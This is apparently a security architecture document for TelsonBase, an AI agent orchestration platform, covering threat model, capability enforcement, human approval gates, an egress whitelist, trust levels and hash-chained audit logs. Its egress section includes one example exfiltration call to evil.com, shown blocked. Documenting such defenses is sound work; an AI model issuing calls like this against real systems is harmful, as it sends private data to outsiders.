# ClawCoat - Security Architecture

**Version:** v11.0.1 · **Maintainer:** Quietfire AI

# Security Architecture

## Overview

TelsonBase implements a **zero-trust security model** for AI agent orchestration. This document describes the security layers, threat model, and implementation details.

## Threat Model

### Threats Addressed

1. **Agent-to-Agent Injection**: A compromised agent attempts to manipulate other agents
2. **Capability Escalation**: An agent attempts to access resources beyond its permissions
3. **External Command Injection**: Malicious instructions arrive via external APIs
4. **Replay Attacks**: Captured messages are re-sent to trigger duplicate actions
5. **Enumeration Attacks**: Agents systematically probe for resources
6. **Data Exfiltration**: Agents attempt to send sensitive data to unauthorized endpoints

### Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        UNTRUSTED ZONE                                    │
│                       (Internet/External)                                │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                    ┌────────────▼────────────┐
                    │    EGRESS GATEWAY       │ ◄── Domain whitelist enforced
                    │    (External Zone)      │
                    └────────────┬────────────┘
                                 │
┌────────────────────────────────▼────────────────────────────────────────┐
│                         CONTROLLED ZONE                                  │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                      BACKEND NETWORK                             │   │
│  │                                                                  │   │
│  │   ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐       │   │
│  │   │ Agent A │   │ Agent B │   │ Agent C │   │   ...   │       │   │
│  │   └────┬────┘   └────┬────┘   └────┬────┘   └────┬────┘       │   │
│  │        │             │             │             │             │   │
│  │        └─────────────┼─────────────┼─────────────┘             │   │
│  │                      ▼                                          │   │
│  │              ┌───────────────┐                                  │   │
│  │              │  ORCHESTRATOR │ ◄── All messages validated here  │   │
│  │              │  (FastAPI)    │                                  │   │
│  │              └───────┬───────┘                                  │   │
│  │                      │                                          │   │
│  │         ┌────────────┼────────────┐                            │   │
│  │         ▼            ▼            ▼                            │   │
│  │    ┌─────────┐  ┌─────────┐  ┌─────────┐                      │   │
│  │    │  Redis  │  │Mosquitto│  │ Ollama  │                      │   │
│  │    └─────────┘  └─────────┘  └─────────┘                      │   │
│  │     (Data)        (Data)        (AI)                          │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  Networks: frontend, backend, data (internal), ai (internal), external   │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## Security Layers

### Layer 1: Network Segmentation

Docker networks isolate services:

| Network | Access | Services |
|---------|--------|----------|
| `frontend` | Public ingress | Traefik |
| `backend` | Application tier | API (incl. MCP gateway at `/mcp`), Workers |
| `data` | Internal only | Redis, Mosquitto |
| `ai` | Internal only | Ollama |
| `external` | Egress only | Egress Gateway |

**Implementation:** `docker-compose.yml` defines networks with `internal: true` flag for data and AI networks.

### Layer 2: API Authentication

All protected endpoints require authentication:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                           API REQUEST                                    │
│                                                                          │
│    X-API-Key: <key>     OR     Authorization: Bearer <jwt>              │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
                    ┌────────────────────────┐
                    │  authenticate_request  │
                    │                        │
                    │  1. Check X-API-Key    │
                    │  2. Check Bearer token │
                    │  3. Validate JWT       │
                    │  4. Log attempt        │
                    └────────────────────────┘
```

**Implementation:** `core/auth.py`

### Layer 3: Message Signing

All inter-agent messages are cryptographically signed:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        SIGNED MESSAGE                                    │
│                                                                          │
│  {                                                                       │
│    "message_id": "unique-uuid",                                         │
│    "agent_id": "source_agent",                                          │
│    "timestamp": "2026-02-01T12:00:00Z",                                │
│    "action": "perform_backup",                                          │
│    "payload": {...},                                                    │
│    "signature": "HMAC-SHA256(canonical_payload, agent_secret_key)"      │
│  }                                                                       │
└─────────────────────────────────────────────────────────────────────────┘
```

**Verification Process:**

1. Extract `agent_id` from message
2. Look up agent's secret key from registry
3. Recompute signature from canonical payload
4. Constant-time compare signatures
5. Check message timestamp is within replay window
6. Check message_id has not been seen before

**Implementation:** `core/signing.py`

### Layer 4: Capability Enforcement

Agents declare capabilities; the system enforces them:

```python
# Agent declaration
class BackupAgent(SecureBaseAgent):
    CAPABILITIES = [
        "filesystem.read:/data/*",
        "filesystem.write:/app/backups/*",
        "external.none",
    ]
```

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      CAPABILITY CHECK FLOW                               │
│                                                                          │
│    Agent requests: filesystem.write:/data/secrets/passwords.txt         │
│                                                                          │
│    1. Parse request: resource=filesystem, action=write,                  │
│                      target=/data/secrets/passwords.txt                  │
│                                                                          │
│    2. Check allow rules:                                                 │
│      - "filesystem.read:/data/*" → wrong action (read vs write)        │
│      - "filesystem.write:/app/backups/*" → wrong path                  │
│      - No match found                                                   │
│                                                                          │
│    3. DENY → PermissionError raised, logged to audit                    │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**Implementation:** `core/capabilities.py`

### Layer 5: Behavioral Anomaly Detection

The system builds baselines and detects deviations:

**Metrics Tracked:**

| Metric | Purpose |
|--------|---------|
| Actions per minute | Detect rate spikes (compromised agent flooding) |
| Known resources | Detect access to new resources |
| Known actions | Detect new behaviors |
| Hourly distribution | Detect unusual timing |
| Error rate | Detect failing attacks |
| Permission denials | Detect capability probing |

**Anomaly Types:**

| Type | Severity | Trigger |
|------|----------|---------|
| `rate_spike` | Medium-High | >3 std dev above baseline |
| `new_resource` | Medium | First access to resource |
| `new_action` | Medium | First execution of action |
| `unusual_timing` | Low | Activity at rare hours |
| `sequential_access` | High | Enumeration patterns |
| `error_spike` | Medium | Elevated error rate |
| `capability_probe` | Critical | Repeated permission denials |

**Implementation:** `core/anomaly.py`

### Layer 6: Human Approval Gates

Sensitive operations pause for human authorization:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      APPROVAL FLOW                                       │
│                                                                          │
│    Agent requests: delete_backup                                         │
│                                                                          │
│    1. Check REQUIRES_APPROVAL_FOR → "delete_backup" is listed           │
│                                                                          │
│    2. Create ApprovalRequest:                                            │
│      - request_id: APPR-ABC123                                          │
│      - priority: high                                                   │
│      - expires_at: +1 hour                                              │
│                                                                          │
│    3. Task PAUSES (threading.Event.wait())                               │
│                                                                          │
│    4. Human reviews via API/Dashboard:                                   │
│       POST /v1/approvals/APPR-ABC123/approve                            │
│                                                                          │
│    5. Event signaled, task resumes                                       │
│                                                                          │
│    6. If rejected or expired: PermissionError raised                     │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**Implementation:** `core/approval.py`

### Layer 7: Egress Firewall

All external API calls go through a whitelist-enforcing gateway:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      EGRESS FLOW                                         │
│                                                                          │
│    Agent calls: external.post("https://evil.com/steal-data", data)      │
│                                                                          │
│    1. EnforcedExternal extracts domain: evil.com                         │
│                                                                          │
│    2. Capability check: Is "external.write:evil.com" in agent's caps?    │
│       → NO → PermissionError                                             │
│                                                                          │
│    3. (If capability existed) Request goes to egress gateway             │
│                                                                          │
│    4. Gateway checks: Is "evil.com" in ALLOWED_EXTERNAL_DOMAINS?         │
│       → NO → 403 Forbidden                                               │
│                                                                          │
│    5. Request BLOCKED at two levels                                       │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**Default Whitelist:**
- api.anthropic.com
- api.perplexity.ai
- api.venice.ai

**Implementation:** `gateway/egress_proxy.py`

### Layer 8: Agent Trust Levels

Agents progress through five trust levels based on behavior:

```
QUARANTINE → PROBATION → RESIDENT → CITIZEN → AGENT
    │           │           │          │          │
    │           │           │          │          └── Apex designation, 99.9% success required,
    │           │           │          │               zero anomaly tolerance, re-verify every 3 days
    │           │           │          └──────────── Full capabilities, 95% success rate required
    │           │           └──────────────────────── Standard caps, periodic re-verification
    │           └──────────────────────────────────── Limited caps, closely monitored
    └──────────────────────────────────────────────── Severely restricted, manual review required
```

**Promotion Criteria:**
- Time in current level (configurable)
- Minimum action count
- Success rate threshold
- Maximum anomaly count
- Human approval (for CITIZEN)

**Automatic Demotion:**
- Critical anomalies trigger immediate demotion
- Threat response can quarantine automatically
- Failed re-verification demotes CITIZEN → RESIDENT

**Implementation:** `core/trust_levels.py`

### Layer 9: Encryption at Rest

Sensitive data in Redis is encrypted with AES-256-GCM:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      ENCRYPTION AT REST                                  │
│                                                                          │
│    Application                                                           │
│        │                                                                 │
│        ▼                                                                 │
│    ┌───────────────────────┐                                            │
│    │  SecureStorageManager │                                            │
│    │                       │                                            │
│    │  1. PBKDF2 key derive │  ← Key from TelsonBase_ENCRYPTION_KEY      │
│    │  2. Generate nonce    │                                            │
│    │  3. AES-256-GCM enc   │                                            │
│    └───────────────────────┘                                            │
│        │                                                                 │
│        ▼                                                                 │
│    ┌───────────────────────┐                                            │
│    │       Redis           │  ← Stores: [version][nonce][ciphertext]   │
│    │   (Encrypted Data)    │                                            │
│    └───────────────────────┘                                            │
│                                                                          │
│    Encrypted fields: signing_key, secret_key, api_key, token,           │
│                      password, private_key, session_key                 │
└─────────────────────────────────────────────────────────────────────────┘
```

**Implementation:** `core/secure_storage.py`

### Layer 10: Automated Threat Response

Critical threats trigger automatic containment:

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    THREAT RESPONSE ENGINE                                │
│                                                                          │
│    Anomaly Event                                                         │
│        │                                                                 │
│        ▼                                                                 │
│    ┌───────────────────────┐                                            │
│    │  Threat Indicators    │                                            │
│    │                       │                                            │
│    │  • Critical burst     │ → QUARANTINE + REVOKE_DELEGATIONS          │
│    │  • Approval bypass    │ → QUARANTINE                                │
│    │  • Signature failure  │ → QUARANTINE + REVOKE_DELEGATIONS          │
│    │  • Capability probe   │ → DEMOTE + BLOCK_EXTERNAL                  │
│    │  • Excessive failures │ → RATE_LIMIT + ALERT                       │
│    └───────────────────────┘                                            │
│        │                                                                 │
│        ▼                                                                 │
│    ┌───────────────────────┐                                            │
│    │  Response Policies    │  Per threat level:                         │
│    │                       │  • CRITICAL: Act immediately               │
│    │                       │  • HIGH: Act immediately, notify           │
│    │                       │  • MEDIUM: Require confirmation            │
│    │                       │  • LOW: Alert only                         │
│    └───────────────────────┘                                            │
│        │                                                                 │
│        ▼                                                                 │
│    [AUTOMATED ACTION TAKEN] → Audit logged                              │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

**Implementation:** `core/threat_response.py`

---

## Audit Trail

Every security-relevant action is logged with cryptographic hash chaining (v4.3.0CC):

```json
{
  "timestamp": "2026-02-01T12:00:00.000Z",
  "event_type": "task.dispatched",
  "message": "Task ::backup_agent.delete_backup:: dispatched_Please",
  "actor": "admin@example.com",
  "resource": "task-abc123",
  "details": {
    "task_name": "backup_agent.delete_backup",
    "args": {"backup_id": "backup-001"}
  },
  "chain": {
    "sequence": 1542,
    "entry_hash": "a3f2b1c4...",
    "previous_hash": "9d8e7f6a...",
    "chain_id": "abc123def456"
  }
}
```

### Cryptographic Hash Chaining

Each audit entry includes:
- **sequence**: Monotonically increasing entry number
- **entry_hash**: SHA-256 hash of current entry + previous hash
- **previous_hash**: Hash of the previous entry (genesis hash for first entry)
- **chain_id**: Unique identifier for this chain instance

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      HASH CHAIN STRUCTURE                                │
│                                                                          │
│  Entry 1           Entry 2           Entry 3                            │
│  ┌─────────┐       ┌─────────┐       ┌─────────┐                       │
│  │ seq: 1  │  ┌───►│ seq: 2  │  ┌───►│ seq: 3  │                       │
│  │ data... │  │    │ data... │  │    │ data... │                       │
│  │ prev: 0 │  │    │ prev:H1 │  │    │ prev:H2 │                       │
│  │ hash:H1 │──┘    │ hash:H2 │──┘    │ hash:H3 │                       │
│  └─────────┘       └─────────┘       └─────────┘                       │
│                                                                          │
│  Tampering with Entry 2 invalidates H2, breaking link to Entry 3       │
└─────────────────────────────────────────────────────────────────────────┘
```

**Chain Verification:**
- `GET /v1/audit/chain/verify` - Verify chain integrity
- `GET /v1/audit/chain/export` - Export for compliance
- Detects any tampered or missing entries

**Events Logged:**

- Authentication success/failure
- Task dispatch/complete/fail
- External requests (allowed and blocked)
- Anomaly detection
- Approval requests and decisions
- Federation trust changes
- Threat response actions
- Agent trust level changes
- Re-verification results

**Implementation:** `core/audit.py`

---

## Federation Security

Cross-instance communication uses:

1. **RSA-4096 Key Pairs**: Each instance has a unique identity
2. **HMAC Signatures**: All messages are signed
3. **AES-256-GCM Encryption**: Payloads are encrypted with session keys
4. **Timestamp Validation**: Messages expire after 5 minutes
5. **Explicit Trust**: Trust must be established before communication

**Trust Establishment:**

```
Instance A                                    Instance B
    │                                              │
    │  1. Create invitation (signed)               │
    │  ────────────────────────────────────────►   │
    │                                              │
    │                    2. Verify signature       │
    │                    3. Review trust terms     │
    │                    4. Accept (signed)        │
    │  ◄────────────────────────────────────────   │
    │                                              │
    │  5. Exchange session key (encrypted)         │
    │  ────────────────────────────────────────►   │
    │                                              │
    │  6. Trust ESTABLISHED                        │
    │  ◄═══════════════════════════════════════►   │
    │     (Encrypted, signed messages allowed)     │
```

**Implementation:** `federation/trust.py`

---

## Security Recommendations

### Production Deployment

1. **Change all default secrets:**
   ```bash
   export MCP_API_KEY=$(openssl rand -hex 32)
   export JWT_SECRET_KEY=$(openssl rand -hex 32)
   export WEBUI_SECRET_KEY=$(openssl rand -hex 32)
   export GRAFANA_ADMIN_PASSWORD=$(openssl rand -hex 16)
   ```

   > **Note:** The system warns at startup if JWT_SECRET_KEY uses an insecure default.

2. **Restrict CORS origins** via environment variable:
   ```bash
   export CORS_ORIGINS='["https://app.example.com","https://admin.example.com"]'
   ```

   > **Note:** Defaults to `["*"]` which allows any origin. Always restrict in production.

3. **Enable TLS** via Traefik (already configured)

4. **Lock down network access:**
  - Only expose ports 80/443 to internet
  - Keep management ports (Redis, MQTT) internal

5. **Regular backups** of Redis data (contains security state)

6. **Monitor anomaly dashboard** daily

7. **Review pending approvals** promptly

8. **Monitor security warnings** in application logs for:
  - Insecure secret warnings
  - Failed authentication attempts
  - Capability probe detections

### Adding New Agents

1. Use minimal capabilities (principle of least privilege)
2. Add `external.none` unless external access is required
3. Add destructive actions to `REQUIRES_APPROVAL_FOR`
4. Test capability restrictions before deployment

### Federation

1. Verify remote instance fingerprint out-of-band
2. Start with `minimal` trust level
3. Restrict `allowed_agents` to specific agents
4. Review federation audit logs regularly
5. Revoke trust immediately if suspicious activity detected

### Encryption at Rest

1. **Set encryption key:**
   ```bash
   export TelsonBase_ENCRYPTION_KEY=$(openssl rand -hex 32)
   export TelsonBase_ENCRYPTION_SALT=$(openssl rand -hex 16)
   ```

2. **Store keys securely:**
  - Use a secrets manager (HashiCorp Vault, AWS Secrets Manager)
  - Never commit keys to version control
  - Maintain encrypted offline backup

3. **Key rotation:**
  - Plan for periodic key rotation
  - Decrypt/re-encrypt data with new key
  - Test recovery procedures

### Audit Chain Integrity

1. **Regular verification:**
   ```bash
   curl -H "X-API-Key: $KEY" http://localhost:8000/v1/audit/chain/verify
   ```

2. **Compliance exports:**
  - Export chain data regularly
  - Store exports off-site
  - Verify chain before archiving

3. **Chain breaks:**
  - Investigate immediately if breaks detected
  - Check for unauthorized access
  - Document in incident report

### Threat Response

1. **Review automated actions:**
  - Check `/v1/threats/recent` daily
  - Verify quarantine decisions are appropriate
  - Clear false positives through proper channels

2. **Tune threat indicators:**
  - Adjust thresholds based on environment
  - Add custom indicators for specific threats
  - Disable indicators causing false positives

3. **Human override:**
  - Automated responses can be overridden
  - Document all manual interventions
  - Update policies if patterns emerge

---

## Compliance Mapping

### SOC2 Trust Services Criteria

| Criteria | TelsonBase Feature |
|----------|-------------------|
| CC6.1 Logical access | API authentication, RBAC |
| CC6.2 Prior authorization | Capability system, approval gates |
| CC6.3 New/changed access | Trust level progression |
| CC7.1 Detect anomalies | Anomaly detection, threat response |
| CC7.2 Monitor components | Audit logging, chain verification |
| CC7.3 Evaluate events | Threat indicators, policies |
| CC7.4 Respond to events | Automated threat response |

### ISO 27001 Control Mapping

| Control | TelsonBase Feature |
|---------|-------------------|
| A.9.2 User access | RBAC, trust levels |
| A.9.4 System access | Capability enforcement |
| A.10.1 Cryptographic | Message signing, encryption at rest |
| A.12.4 Logging | Audit chain, tamper-evident logs |
| A.16.1 Incident management | Threat response, incident plan |

**Export compliance reports:** `POST /v1/compliance/export`

---

## Compliance Considerations

TelsonBase is designed with regulatory compliance awareness. While the platform provides security controls, **compliance certification requires additional organizational policies and procedures**.

### HIPAA (Healthcare)

TelsonBase supports HIPAA compliance through:
- **Encryption at rest** (AES-256-GCM for sensitive data in Redis)
- **Audit trails** (cryptographic hash-chained logs for non-repudiation)
- **Access controls** (RBAC, capability-based permissions)
- **Network segmentation** (isolated Docker networks)

**Additional requirements:**
- BAA (Business Associate Agreement) with hosting provider
- Formal risk assessment documentation
- Workforce training and policies
- Physical security controls for on-premise deployments

### GDPR (European Data Protection)

TelsonBase supports GDPR compliance through:
- **Data sovereignty** (self-hosted, data never leaves your control)
- **Audit logging** (track all data access and processing)
- **Federated architecture** (data stays in appropriate jurisdictions)
- **Approval gates** (human oversight for sensitive operations)

**Additional requirements:**
- Data Processing Agreement (DPA) documentation
- Privacy Impact Assessment (PIA)
- Data Subject Access Request (DSAR) procedures
- Documented lawful basis for processing

### Financial Services (SOX, PCI-DSS)

TelsonBase supports financial compliance through:
- **Change control** (audit trail of all modifications)
- **Access segregation** (trust levels, RBAC)
- **Monitoring** (anomaly detection, threat response)
- **Encryption** (in transit via TLS, at rest via AES-256)

**Additional requirements:**
- Formal change management policies
- Penetration testing by qualified assessors
- Documented incident response procedures
- Regular compliance audits

### Compliance Export

Generate compliance evidence packages:
```bash
curl -X POST -H "X-API-Key: $KEY" \
  http://localhost:8000/v1/compliance/export \
  -d '{"framework": "SOC2", "start_date": "2026-01-01", "end_date": "2026-02-01"}'
```

Supported frameworks: `SOC2`, `ISO27001`

---

## Incident Response

For security incidents, follow the [Incident Response Plan](INCIDENT_RESPONSE.md).

**Key contacts and escalation paths should be documented in your organization's incident response procedures.**

Quick reference:
1. **Detect** - Anomaly dashboard, threat alerts, audit logs
2. **Contain** - Quarantine agents, revoke trust, block egress
3. **Eradicate** - Remove compromised components, rotate secrets
4. **Recover** - Restore from backup, re-establish trust
5. **Learn** - Post-incident review, update policies

---

## Related Documents

- [Incident Response Plan](INCIDENT_RESPONSE.md) - Critical: Review before any security event
- [Disaster Recovery Plan](DISASTER_RECOVERY.md)
- [Developer Guide](DEVELOPER_GUIDE.md)
- [API Reference](API_REFERENCE.md)

---

*TelsonBase v11.0.1 · Quietfire AI · March 8, 2026*
